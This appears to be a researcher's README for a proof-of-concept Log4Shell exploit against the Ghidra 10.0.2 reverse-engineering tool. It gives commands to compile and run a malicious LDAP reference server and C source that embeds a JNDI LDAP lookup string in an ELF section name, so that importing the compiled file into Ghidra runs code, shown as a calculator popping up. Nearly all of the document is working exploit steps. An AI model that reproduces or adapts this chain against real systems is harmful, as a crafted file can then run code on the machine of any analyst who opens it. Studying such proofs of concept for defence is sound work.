An exploit for Log4Shell for Ghidra 10.0.2 on macOS. (Should also work on other OSes)

```
$ java -version
openjdk version "11.0.4" 2019-07-16 LTS
OpenJDK Runtime Environment Corretto-11.0.4.11.1 (build 11.0.4+11-LTS)
OpenJDK 64-Bit Server VM Corretto-11.0.4.11.1 (build 11.0.4+11-LTS, mixed mode)
```

You will need https://github.com/pingidentity/ldapsdk/releases/tag/6.0.3

Compile and start the LDAP server:

```
java -jar /Users/zhuowei/Downloads/ghidra_10.0.2_PUBLIC/Ghidra/Features/Python/lib/jython-standalone-2.7.2.jar generate_jython_payload.py
javac -cp .:/Users/zhuowei/Downloads/unboundid-ldapsdk-6.0.3/unboundid-ldapsdk.jar LDAPRefServer.java
java -cp .:/Users/zhuowei/Downloads/unboundid-ldapsdk-6.0.3/unboundid-ldapsdk.jar LDAPRefServer 1234
```

Compile the malicious executable into ELF format:

```
__attribute__((__section__(".note.${jndi:ldap://127.0.0.1:1234/abc}")))
int a = 1;
int main(){}
```

```
gcc poc.c
```

Import into Ghidra. A calculator should pop up.
